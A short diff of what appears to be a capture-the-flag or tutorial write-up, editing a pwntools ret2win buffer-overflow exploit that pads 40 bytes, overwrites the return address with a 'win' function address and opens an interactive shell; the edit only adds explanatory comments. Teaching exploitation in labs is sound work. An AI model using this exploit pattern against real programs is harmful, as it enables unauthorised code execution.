@@ -66,9 +66,9 @@ offset = 40                 # from cyclic
 win    = 0xdeadbeef         # from GDB
 
 payload  = b"A" * offset    # junk to reach return address
-payload += p64(win)         # overwrite return address
+payload += p64(win)         # overwrite return address (p32(1) --> 01 00 00 00)
 
-p.sendline(payload)
+p.sendline(payload)         # or p.send(payload) (new line can cause precision issues)
 p.interactive()             # catch the shell
 ```
 
